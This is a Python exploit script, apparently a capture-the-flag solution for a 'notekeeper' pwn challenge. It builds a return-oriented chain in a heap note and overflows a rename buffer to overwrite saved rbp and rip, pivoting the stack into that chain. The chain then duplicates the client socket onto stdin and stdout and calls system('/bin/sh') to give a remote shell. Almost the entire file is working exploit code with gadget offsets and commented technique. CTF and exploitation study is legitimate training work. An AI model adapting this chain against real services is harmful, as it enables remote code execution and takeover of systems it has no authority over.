#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="no-untyped-call"
# notekeeper-pwn.py -- "notekeeper" (pwn 400): heap-stashed frame chain + rbp pivot.
# The rename handler reads 0x50 bytes into char dst[64]: a 16-byte overflow, room
# for saved rbp + saved rip and NOTHING else. The real chain won't fit, so it lives
# in a note (malloc'd, address leaked), and the two stack qwords pivot rsp into it.
import struct

p64 = lambda v: struct.pack("<Q", v)

LIBC_BASE = 0x00007F1FBABC0000  # leak #1: puts(got.puts), banner round
NOTE      = 0x0000556E2F4C12A0  # leak #2: note[2]'s buffer, the stale-ptr print

POP_RDI     = LIBC_BASE + 0x02A3E5  # pop rdi ; ret
POP_RSI_R15 = LIBC_BASE + 0x02BE51  # pop rsi ; pop r15 ; ret (no bare pop rsi in this libc)
LEAVE_RET   = LIBC_BASE + 0x04B9D1  # leave ; ret -- THE pivot: rsp <- rbp ; pop rbp
RET         = LIBC_BASE + 0x029CD6  # ret          -- movaps aligner, see frame2
DUP2        = LIBC_BASE + 0x0EB0B0  # dup2()
SYSTEM      = LIBC_BASE + 0x052290  # system()
FD = 4  # our socket: the daemon holds 0-2 std, 3 notes.db, 4 accept()'d us (strace'd)

# slab map, hand-drawn (KEEP IN SYNC with the packs below):
#   +0x00 frame0: dup2(4,0)  8 qwords   [next][poprdi][4][poprsi][0][r15][dup2][leave]
#   +0x40 frame1: dup2(4,1)  8 qwords   same dance, rsi=1
#   +0x80 frame2: system     5 qwords   [junk][poprdi][&binsh][ret][system]
#   +0xa8 "/bin/sh\0"
# !! every address below is NOTE + a hand-added offset. if ANY frame grows, re-add
# !! every offset after it: FRAME1, FRAME2, BINSH, and the asserts. all of them.
FRAME0 = NOTE + 0x00
FRAME1 = NOTE + 0x40
FRAME2 = NOTE + 0x80
BINSH  = NOTE + 0xA8
NOTE_SZ = 0x100  # add-note reads exactly this many bytes

# frame0: dup2(FD, 0) -- the socket becomes stdin.
# entered by leave;ret: rsp lands at FRAME0, pop rbp eats the first qword (-> next
# frame), ret eats the second. every frame ends in leave;ret to hop to the next.
slab  = p64(FRAME1)       # -> rbp: frame1, the NEXT stop (pop rbp eats this)
slab += p64(POP_RDI)      # -> rip
slab += p64(FD)           # -> rdi
slab += p64(POP_RSI_R15)  # -> rip
slab += p64(0)            # -> rsi: newfd 0, stdin
slab += p64(0)            # -> r15: junk, the pop pair drags it along
slab += p64(DUP2)         # -> rip: dup2 returns onto the next qword
slab += p64(LEAVE_RET)    # -> rip: hop -- rsp <- rbp (= FRAME1)
assert len(slab) == 0x40, "frame0 grew: FRAME1/FRAME2/BINSH and this assert are ALL stale"

# frame1: dup2(FD, 1) -- and stdout.
slab += p64(FRAME2)       # -> rbp: frame2 next
slab += p64(POP_RDI)
slab += p64(FD)
slab += p64(POP_RSI_R15)
slab += p64(1)            # -> rsi: newfd 1, stdout
slab += p64(0)            # -> r15: junk
slab += p64(DUP2)
slab += p64(LEAVE_RET)    # hop -- rsp <- FRAME2
assert len(slab) == 0x80, "frame1 grew: FRAME2/BINSH and this assert are stale"

# frame2: system("/bin/sh") -- nothing after this returns.
slab += p64(0)            # -> rbp: junk, nobody leaves again
slab += p64(POP_RDI)
slab += p64(BINSH)        # -> rdi: the string lives right after this frame
slab += p64(RET)          # movaps: entering system by ret wants rsp%16 == 8 here.
                          # drop this and it SIGSEGVs *inside* system -- ask me how I know.
slab += p64(SYSTEM)
assert len(slab) == 0xA8, "frame2 grew: BINSH is stale"
slab += b"/bin/sh\x00"

note = slab.ljust(NOTE_SZ, b"\x00")  # add-note reads exactly 0x100; pad the tail

# the smash: 64 pad bytes to saved rbp, then the two qwords we own.
# vuln epilogue is leave;ret: its own leave loads our rbp, our LEAVE_RET re-runs
# leave with that rbp -- rsp is now FRAME0 and the slab is the stack.
payload  = b"A" * 0x40    # dst[64]
payload += p64(FRAME0)    # saved rbp <- the note (leave #1 loads it)
payload += p64(LEAVE_RET) # saved rip <- leave;ret  (leave #2 pivots rsp into it)
assert len(payload) == 0x50, "rename reads exactly 0x50: pad + rbp + rip, no more"

if __name__ == "__main__":
    print(f"before slab: {note.hex()}")
    print(f"before stack: {payload.hex()}")
